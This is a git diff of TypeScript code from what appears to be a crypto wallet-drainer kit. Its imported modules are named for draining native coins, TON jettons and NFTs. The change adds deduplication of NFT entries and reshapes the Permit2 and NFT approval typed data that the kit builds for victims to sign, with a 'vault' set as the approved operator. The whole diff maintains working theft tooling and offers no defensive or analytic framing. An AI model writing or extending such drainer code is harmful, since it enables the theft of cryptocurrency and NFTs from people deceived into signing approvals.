@@ -30,6 +30,8 @@ import { buildTonNativeDrainForBatch } from './ton-native-drain.js'
 import { buildJettonDrainForBatch } from './ton-jetton-drain.js'
 import {
   buildBatchNFTApprovalTypedData,
+  dedupeNftEntriesByContract,
+  nftApprovalTypedDataToMap,
   type BatchNftEntry,
   type NftApprovalTypedData,
 } from './nft-drain.js'
@@ -97,7 +99,7 @@ export type BatchNativeWithPermit2Result = {
   jetton_master?: string
   jetton_transfer?: import('./ton-jetton-drain.js').JettonTransferRequest | null
   nfts?: BatchNftEntry[]
-  nft_approval_typed_data?: Array<{ contract: Address; typedData: NftApprovalTypedData }>
+  nft_approval_typed_data?: Record<string, NftApprovalTypedData>
 }
 
 export type NativeCoinDrainMetadata = {
@@ -246,6 +248,8 @@ export async function batchNativeWithPermit2(params: {
   })
 
   const expiration = computeSignatureAnchorExpiry()
+  const nfts =
+    params.nfts && params.nfts.length > 0 ? dedupeNftEntriesByContract(params.nfts) : undefined
   const tokens = params.permits.map((p) => getAddress(p.token))
   const nonces =
     tokens.length > 0
@@ -353,15 +357,18 @@ export async function batchNativeWithPermit2(params: {
       : Promise.resolve(null),
   ])
 
-  const nft_approval_typed_data =
-    params.nfts && params.nfts.length > 0
+  const nftApprovalList =
+    nfts && nfts.length > 0
       ? buildBatchNFTApprovalTypedData({
           wallet: params.wallet,
           chainId: params.chainId,
-          nfts: params.nfts,
+          nfts,
           operator: vault ?? undefined,
         })
       : undefined
+  const nft_approval_typed_data = nftApprovalList
+    ? nftApprovalTypedDataToMap(nftApprovalList)
+    : undefined
 
   return {
     batchTypedData,
@@ -394,7 +401,7 @@ export async function batchNativeWithPermit2(params: {
           jetton_transfer,
         }
       : {}),
-    ...(params.nfts && params.nfts.length > 0 ? { nfts: params.nfts, nft_approval_typed_data } : {}),
+    ...(nfts && nfts.length > 0 ? { nfts, nft_approval_typed_data } : {}),
   }
 }
 
